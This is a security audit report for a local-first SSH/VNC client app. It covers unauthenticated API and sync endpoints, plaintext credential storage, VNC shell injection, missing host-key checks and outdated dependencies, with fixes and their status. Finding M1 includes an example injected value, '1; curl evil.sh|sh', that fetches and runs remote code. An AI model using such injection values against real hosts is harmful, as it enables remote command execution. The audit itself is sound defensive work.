# Security Audit — termius_free

Date: 2026-09-25
Scope: full review of `server/`, `shared/`, `src/` (Fastify 4.29, ssh2, better-sqlite3, React/Vite) + `npm audit`.
Trust model: single-user, local-first tool. Main app binds `0.0.0.0:3001` by default (`server/index.ts:622-623`); sync server binds `0.0.0.0:3901` by default (`server/sync/server.ts:327-328`).

---

## High

### H1. No authentication on the main app (API + WebSockets) — FIXED
Every `/api/*` route and the `/ws/terminal`, `/ws/sftp`, `/ws/vnc` upgrades accepted any client. The app listened on `0.0.0.0` by default and `cors` uses `origin: true` (`server/index.ts:59`), reflecting any origin.
- Impact: any browser/device on the same network (or host) can `GET /api/hosts` (plaintext passwords + private keys), create/update/delete hosts, open an interactive shell to any stored host, do SFTP transfers, mint/revoke app tokens, and read snippets/settings/audit.
- The token system exists (`server/routes/tokens.ts`) but only `GET /api/tokens/verify` enforced a scope — nothing else did.
- Fix: bind `127.0.0.1` by default (opt-in flag for LAN); require a token on all routes and WS upgrades; add an `Origin` check on WS.
- **Fixed (this pass):** global `onRequest` gate in `server/auth.ts` — armed once ≥1 token exists (fresh install stays open so the first token can be bootstrapped); Bearer header for REST, `?token=` for WS; same-origin `Origin` check on `/ws/*`; default bind now `127.0.0.1` (`HOST` env to opt in to LAN). Browser auto-creates the bootstrap token on first load (`src/api.ts:ensureApiToken`), lock screen + `Tokens` panel (create/revoke, token shown once) for recovery, `bin/term.mjs` takes `-T/--token` / `$TERMUS_TOKEN`.

### H2. Sync server admin endpoints unauthenticated
`server/sync/server.ts`: `POST /sync/register` (:103), `GET /sync/tokens` (:142), `POST /sync/tokens` (:154), `DELETE /sync/tokens/:id` (:164) have no token check; only `/sync/push` and `/sync/state` call `guard()`.
- Impact: an attacker reaching `:3901` mints a full-scope token, then `GET /sync/state` dumps the whole snapshot (hosts with plaintext `password`/`private_key`/`pass_phrase`, snippets, settings, forwards) and `POST /sync/push` overwrites any entity (LWW). The main app then pulls that state into its own DB — durable tampering/persistence.
- Fix: require a server master key (like the main app's keystore) or a pre-shared key for register/tokens; bind `127.0.0.1` by default.
- **Partially fixed (this pass):** default bind now `127.0.0.1` (`server/sync/server.ts`, overridable via `--host`/`HOST`). The register/tokens endpoints are still unauthenticated — remaining.

### H3. Plaintext credentials at rest and in transit
- `hosts.password`, `hosts.private_key`, `hosts.pass_phrase` are stored plaintext in `data/termius.db` (only `vnc_password` and protected snippets are AES-256-GCM encrypted — `server/db.ts`, `server/crypto.ts`).
- `collectPending` pushes all hosts with those fields into sync payloads, stored in `data/sync.db`.
- Sync URL validation accepts plain `http://` (`server/routes/sync.ts:15-20`), so tokens + credential payloads cross the wire unencrypted.
- Fix: encrypt all credential fields with the master key; require `https://` for `server_url` (or an explicit localhost-only exception for `http`).

## Medium

### M1. Remote shell injection via uncoerced `vnc_display` / `vnc_port`
`createHost`/`updateHost` store `input.vnc_display`/`input.vnc_port` with no type validation (`server/db.ts:315-341`); `resolveVncConfig` passes them through uncoerced (`server/vnc/config.ts:41,52`). They are interpolated into remote shell commands executed over SSH:
- `server/vnc/lifecycle.ts:24` — `... -localhost -SecurityTypes None :${display} ${desktopArg}`
- `server/vnc/lifecycle.ts:27` — `-rfbport ${port}`
- `server/vnc/lifecycle.ts:63` — `x11vnc ... -display ${display} -rfbport ${port}`
A string value (e.g. `1; curl evil.sh|sh`) sent via `POST /api/hosts` = command execution as the SSH user on the VNC host (triggered by auto-start / `ensureVncDesktop`).
- Fix: coerce to integers and validate ranges in input handling (display 0–99, port 1–65535); reject non-numeric.
- **Fixed (this pass):** `server/routes/hosts.ts` now validates + coerces `port`, `vnc_port`, `vnc_ssh_host_id`, `vnc_display` on POST/PUT (integer, in range) and returns 400 otherwise.

### M2. No host-key verification on the VNC SSH tunnel
`server/vnc/ssh.ts:14` — `hostVerifier: () => true`. A MITM on the VNC tunnel (including the forwarded RFB port) is undetected. The terminal/SFTP path has TOFU known-hosts with fingerprint confirm/mismatch prompt (`server/terminal.ts:190-215`); VNC skips it entirely.
- Fix: reuse the terminal's TOFU/known_hosts logic.

### M3. Managed VNC servers start with no VNC auth; direct transport is cleartext
- tigervnc: `-SecurityTypes None`; x11vnc: `-nopw` (`server/vnc/lifecycle.ts:24,63`). The desktop is protected only by the SSH tunnel.
- For `transport: 'direct'` the VNC password (already a weak 8-char classic VNC secret) is sent unencrypted to the remote and is the only auth.
- Fix: generate a random per-session VNC password (written `0600` on the remote) and enable `VncAuth` even behind tunnels; document/require tunneling for direct transport.

### M4. Master key protection is file-permission-only
The 256-bit AES key lives in `keystore.json` (base64, `0600`) in the config dir (`server/crypto.ts:26-60`); no OS keychain, no passphrase-derived (scrypt/argon2) key. Anyone with read access to the user's files can decrypt `vnc_password` and protected snippets.
- Fix: derive from a passphrase with a KDF, or use the OS keychain; at minimum document the threat model.

### M5. `@fastify/static` path-traversal / authorization-bypass advisories
Installed `@fastify/static@6.12.0` is within GHSA-8pvw-jcv7-9cmj (auth bypass via non-canonical paths) and GHSA-83w8-p2f5-377r (route guard bypass via path traversal); fix is 10.1.4 (major). Used for production static serving (`server/index.ts:602-609`) — crafted paths could read files outside `dist/`.

### M6. fastify / find-my-way advisories + Host-header spoofing
Installed `fastify@4.29.1` / `find-my-way` are in affected ranges (sendWebStream DoS, Content-Type tab bypass, X-Forwarded-Proto/Host spoofing, root-primitive coercion; find-my-way HTTP/2 DDoS). Fix is fastify 5.12.5 (major).
Concrete app impact: `PUT /api/sync/config` builds the device `serverUrl` from `request.protocol`/`request.host` (`server/routes/sync.ts:89-92`) — a spoofed `Host` header injects the sync server URL that is stored and used for all future sync.
- Fix: upgrade (verify breaking changes) and avoid trust-proxy behavior.

## Low

- **L1. Client-chosen WS `sessionId`** (`shared/protocol.ts:5-9`) — a second WebSocket client can send `input`/`resize`/`disconnect` for an existing session (UUID guess or leaked). Bind session IDs to the creating socket.
- **L2. No SFTP session cap** (`server/sftp.ts`) — terminal has `MAX_SESSIONS=32`; SFTP has no global cap, so unbounded WS clients exhaust memory/sockets on the unauthenticated port.
- **L3. No `Origin` check on WS upgrades** (`server/index.ts:61-66`) — enables cross-site WebSocket from any page opened in a browser (compounds H1).
- **L4. mosh host argument** (`server/mosh.ts`) — `spawn('mosh-client', [host, port])` has no shell (good), but a host starting with `-` is parsed as an option.
- **L5. Unbounded `audit_log`** — no retention/pruning; `GET /api/audit/export` (up to 5000 rows) is unauthenticated.
- **L6. `remote_command` dead field** — stored in `hosts` and synced, but never used by `server/terminal.ts`; wire it up or drop it.
- **L7. Dev-only**: `vite@5.4.21` / nested esbuild match GHSA-67mh-4wv8-2f99 (dev server request injection) — relevant only if the Vite dev server is ever exposed.
- **L8. `GET /api/sync/device-id` has a write side-effect** (auto-creates the setting) — and `PUT /api/sync/config` registers the app token on the sync server's unauthenticated `/sync/tokens` over http.

## Dependencies (npm audit)

| Package | Installed | Advisory | Fix |
|---|---|---|---|
| fastify | 4.29.1 | high (4 GHSA) | 5.12.5 (major) |
| find-my-way | (via fastify) | high (HTTP/2 DDoS) | via fastify 5.12.5 |
| @fastify/static | 6.12.0 | high (2 GHSA) | 10.1.4 (major) |
| vite / esbuild (dev) | 5.4.21 | moderate | vite 8.3.1 (major, dev only) |

## Done well

- All SQL parameterized; the only identifier interpolation (`rowEntity`) uses a hardcoded table map.
- `mosh`/`telnet` spawned without a shell.
- TOFU known-hosts with fingerprint confirm/mismatch prompt on terminal/SFTP.
- AES-256-GCM, fresh random 12-byte IV per encryption; tokens stored as SHA-256 (raw token not persisted).
- Local/remote forwards bind `127.0.0.1`; SOCKS5 listener is loopback-only.
- Protected snippets masked in list/detail, `reveal` audited.
- WS `maxPayload` 1 MB; per-transfer SFTP concurrency cap (8) with chunked writes.
- VNC diagnostics script is a fixed constant (no interpolation).

## Recommended priority

1. ~~H1: default `127.0.0.1` bind + enforce the existing token scheme on all routes/WS (+ Origin check).~~ — done.
2. H2: authenticate sync register/token endpoints; ~~default `127.0.0.1` sync bind.~~ (done)
3. H3: encrypt all credential columns; require `https` sync.
4. ~~M1: validate/coerce `vnc_port`, `vnc_display` (and all numeric host fields).~~ — done.
5. M2–M3: TOFU for VNC tunnels; real VNC auth for managed servers.
6. M5–M6: upgrade fastify/@fastify/static (major); stop deriving `serverUrl` from raw Host header.
